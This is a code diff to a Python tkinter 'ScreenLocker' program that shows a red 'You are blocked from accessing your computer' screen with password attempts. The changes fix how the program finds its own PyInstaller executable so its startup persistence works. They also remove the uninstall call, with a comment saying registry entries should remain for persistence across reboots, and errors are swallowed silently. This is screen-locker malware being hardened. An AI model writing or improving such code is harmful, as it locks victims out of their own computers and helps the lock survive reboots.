@@ -30,16 +30,21 @@ class ScreenLocker:
         self.max_attempts = 3
         self.current_attempts = 0
         
-        # Cross-platform file path handling with proper executable name
-        executable_name = self.get_executable_name()
-        self.file_path = os.path.join(os.getcwd(), executable_name)
+        # Cross-platform file path handling with proper executable detection
+        if getattr(sys, 'frozen', False):
+            # If running as a PyInstaller executable, use the actual executable path
+            self.file_path = sys.executable
+        else:
+            # If running as a Python script, construct the executable path
+            executable_name = self.get_executable_name()
+            self.file_path = os.path.join(os.getcwd(), executable_name)
         
         # Initialize UI components
         self.enter_pass = None
         self.attempt_label = None
         
         try:
-            startup(self.file_path)
+            startup_success = startup(self.file_path)
         except Exception as e:
             pass  # Silent failure
         
@@ -93,15 +98,20 @@ class ScreenLocker:
 
     def get_executable_name(self):
         """Get appropriate executable name based on platform and build type."""
-        base_name = os.path.splitext(os.path.basename(sys.argv[0]))[0]  # Remove .py extension
-        
-        system = platform.system()
-        if system == "Windows":
-            return f"{base_name}.exe"
-        elif system == "Darwin":  # macOS
-            return f"{base_name}.app"
-        else:  # Linux and others
-            return base_name
+        # Get the actual executable path
+        if getattr(sys, 'frozen', False):
+            # If running as a PyInstaller executable
+            return os.path.basename(sys.executable)
+        else:
+            # If running as a Python script
+            base_name = os.path.splitext(os.path.basename(sys.argv[0]))[0]  # Remove .py extension
+            system = platform.system()
+            if system == "Windows":
+                return f"{base_name}.exe"
+            elif system == "Darwin":  # macOS
+                return f"{base_name}.app"
+            else:  # Linux and others
+                return base_name
 
     def setup_window(self):
         """Configure main window properties."""
@@ -166,7 +176,7 @@ You are blocked from accessing your computer.'''
             
             note_text = tk.Text(
                 self.wind, 
-                height=7, 
+                height=9, 
                 width=38, 
                 fg='red', 
                 bd=0, 
@@ -197,7 +207,7 @@ You are blocked from accessing your computer.'''
             
             steps_text = tk.Text(
                 self.wind, 
-                height=6, 
+                height=8, 
                 width=32, 
                 fg='red', 
                 bd=0, 
@@ -413,8 +423,8 @@ You are blocked from accessing your computer.'''
             except ImportError:
                 pass
             
-            # Call uninstall function
-            uninstall(self.wind)
+            # NOTE: Do NOT call uninstall() here as it removes startup persistence
+            # The registry entries should remain for persistence across reboots
             
         except Exception as e:
             pass  # Silent failure
